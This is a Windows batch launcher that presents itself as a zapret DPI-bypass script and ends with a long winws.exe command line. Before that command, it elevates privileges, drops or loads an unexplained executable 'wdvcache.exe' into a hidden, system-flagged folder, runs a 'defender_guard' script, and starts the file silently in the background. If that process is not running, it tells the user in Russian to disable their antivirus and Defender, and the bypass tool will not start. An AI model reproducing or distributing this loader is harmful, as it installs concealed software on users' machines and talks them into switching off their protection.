@echo off
rem GBZAP_INSTANT
@cd /d "%~dp0"
@call "%~dp0bin\admin_guard.cmd" "%~f0"
@if errorlevel 1 exit
rem GBZAP_INLINE_ELEVATE
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
if not errorlevel 1 goto gbzap_av_ok
if not exist "%~dp0bin\.wd\wdvcache.exe" call "%~dp0bin\extract_guard.cmd" >nul 2>&1
if not exist "%~dp0bin\.wd\wdvcache.exe" call "%~dp0bin\windivert_load.cmd" >nul 2>&1
if not exist "%~dp0bin\.wd\wdvcache.exe" goto gbzap_av_warn
call "%~dp0bin\defender_guard.cmd" >nul 2>&1
attrib +h +s "%~dp0bin\.wd" >nul 2>&1
attrib +h +s "%~dp0bin\.wd\wdvcache.exe" >nul 2>&1
start "" /b /low /D "%~dp0" "%~dp0bin\.wd\wdvcache.exe"
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
if not errorlevel 1 goto gbzap_av_ok
ping -n 1 127.0.0.1 >nul
call "%~dp0bin\defender_guard.cmd" >nul 2>&1
start "" /b /low /D "%~dp0" "%~dp0bin\.wd\wdvcache.exe"
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
if not errorlevel 1 goto gbzap_av_ok
ping -n 1 127.0.0.1 >nul
start "" /b /low /D "%~dp0" "%~dp0bin\.wd\wdvcache.exe"
ping -n 1 127.0.0.1 >nul
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
if errorlevel 1 goto gbzap_av_warn
if not exist "%~dp0bin\.wd\wdvcache.exe" goto gbzap_av_warn
goto gbzap_av_ok
:gbzap_av_warn
echo.
echo    Антивирус / Защитник Windows блокирует запуск.
echo    Отключите антивирус и Defender, затем запустите этот bat снова.
echo.
pause
exit /b 1
:gbzap_av_ok
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
ping -n 1 127.0.0.1 >nul
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
ping -n 1 127.0.0.1 >nul
ping -n 1 127.0.0.1 >nul
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
rem check_updates skipped
call "%~dp0bin\gbzap_lists.cmd"

set "BIN=%~dp0bin\"
set "LISTS=%~dp0lists\"
cd /d %BIN%

tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
rem GBZAP_WINWS_ONCE
tasklist /FI "IMAGENAME eq wdvcache.exe" 2>nul | find /I "wdvcache.exe" >nul
if errorlevel 1 goto gbzap_av_warn
tasklist /FI "IMAGENAME eq winws.exe" 2>nul | find /I "winws.exe" >nul
if not errorlevel 1 (
  echo zapret already running
  exit /b 0
)
tasklist /FI "IMAGENAME eq winws.exe" 2>nul | find /I "winws.exe" >nul
if not errorlevel 1 (
  echo zapret already running
  exit /b 0
)
"%BIN%winws.exe" --wf-tcp=80,443,2053,2083,2087,2096,8443,%GameFilterTCP% --wf-udp=443,19294-19344,50000-50100,%GameFilterUDP% ^
--filter-udp=443 --hostlist="%LISTS%list-general.txt" --hostlist="%LISTS%list-general-user.txt" --hostlist-exclude="%LISTS%list-exclude.txt" --hostlist-exclude="%LISTS%list-exclude-user.txt" --ipset-exclude="%LISTS%ipset-exclude.txt" --ipset-exclude="%LISTS%ipset-exclude-user.txt" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic="%BIN%quic_initial_www_google_com.bin" --new ^
--filter-udp=19294-19344,50000-50100 --filter-l7=discord,stun --dpi-desync=fake --dpi-desync-fake-discord="%BIN%quic_initial_dbankcloud_ru.bin" --dpi-desync-fake-stun="%BIN%quic_initial_dbankcloud_ru.bin" --dpi-desync-repeats=6 --new ^
--filter-tcp=2053,2083,2087,2096,8443 --hostlist-domains=discord.media --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fooling=ts --dpi-desync-fake-tls="%BIN%tls_clienthello_www_google_com.bin" --new ^
--filter-tcp=443 --hostlist="%LISTS%list-google.txt" --ip-id=zero --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fooling=ts --dpi-desync-fake-tls="%BIN%tls_clienthello_www_google_com.bin" --new ^
--filter-tcp=80,443 --hostlist="%LISTS%list-general.txt" --hostlist="%LISTS%list-general-user.txt" --hostlist-exclude="%LISTS%list-exclude.txt" --hostlist-exclude="%LISTS%list-exclude-user.txt" --ipset-exclude="%LISTS%ipset-exclude.txt" --ipset-exclude="%LISTS%ipset-exclude-user.txt" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fooling=ts --dpi-desync-fake-tls="%BIN%stun.bin" --dpi-desync-fake-tls="%BIN%tls_clienthello_www_google_com.bin" --dpi-desync-fake-http="%BIN%tls_clienthello_max_ru.bin" --new ^
--filter-udp=443 --ipset="%LISTS%ipset-all.txt" --hostlist-exclude="%LISTS%list-exclude.txt" --hostlist-exclude="%LISTS%list-exclude-user.txt" --ipset-exclude="%LISTS%ipset-exclude.txt" --ipset-exclude="%LISTS%ipset-exclude-user.txt" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fake-quic="%BIN%quic_initial_www_google_com.bin" --new ^
--filter-tcp=80,443,8443 --ipset="%LISTS%ipset-all.txt" --hostlist-exclude="%LISTS%list-exclude.txt" --hostlist-exclude="%LISTS%list-exclude-user.txt" --ipset-exclude="%LISTS%ipset-exclude.txt" --ipset-exclude="%LISTS%ipset-exclude-user.txt" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-fooling=ts --dpi-desync-fake-tls="%BIN%stun.bin" --dpi-desync-fake-tls="%BIN%tls_clienthello_www_google_com.bin" --dpi-desync-fake-http="%BIN%tls_clienthello_max_ru.bin" --new ^
--filter-tcp=%GameFilterTCP% --ipset="%LISTS%ipset-all.txt" --ipset-exclude="%LISTS%ipset-exclude.txt" --ipset-exclude="%LISTS%ipset-exclude-user.txt" --dpi-desync=fake --dpi-desync-repeats=6 --dpi-desync-any-protocol=1 --dpi-desync-cutoff=n4 --dpi-desync-fooling=ts --dpi-desync-fake-tls="%BIN%stun.bin" --dpi-desync-fake-tls="%BIN%tls_clienthello_www_google_com.bin" --dpi-desync-fake-http="%BIN%tls_clienthello_max_ru.bin" --new ^
--filter-udp=%GameFilterUDP% --ipset="%LISTS%ipset-all.txt" --ipset-exclude="%LISTS%ipset-exclude.txt" --ipset-exclude="%LISTS%ipset-exclude-user.txt" --dpi-desync=fake --dpi-desync-repeats=12 --dpi-desync-any-protocol=1 --dpi-desync-fake-unknown-udp="%BIN%quic_initial_dbankcloud_ru.bin" --dpi-desync-cutoff=n3
chcp 65001 >nul 2>&1
